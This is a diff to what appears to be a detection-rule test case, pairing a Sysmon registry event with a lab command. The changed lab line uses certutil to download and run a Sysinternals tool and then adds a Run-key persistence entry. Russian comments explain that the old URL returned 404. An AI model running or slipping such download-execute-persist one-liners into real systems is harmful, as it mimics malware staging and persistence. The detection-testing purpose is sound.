@@ -11,4 +11,6 @@ cases:
     events:
       - event: {EventID: 13, Channel: Microsoft-Windows-Sysmon/Operational, EventType: SetValue, Image: 'C:\Windows\System32\reg.exe', TargetObject: 'HKU\S-1-5-21-1-2-3-1001\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\Upd', Details: 'C:\Users\victim\AppData\Roaming\u.exe'}
 lab:
-  - 'certutil -urlcache -split -f https://live.sysinternals.com/whoami.exe C:\Users\Public\w.exe; reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v LabUpd /d "%APPDATA%\w.exe" /f'
+  # Не whoami.exe: у Sysinternals такой утилиты нет, URL отдавал 404 (см. SCE_Exec_Download_Then_Execute).
+  # PsInfo с -accepteula печатает сводку и выходит.
+  - 'certutil -urlcache -split -f https://live.sysinternals.com/PsInfo.exe C:\Users\Public\w.exe; C:\Users\Public\w.exe -accepteula; reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v LabUpd /d "%APPDATA%\w.exe" /f'
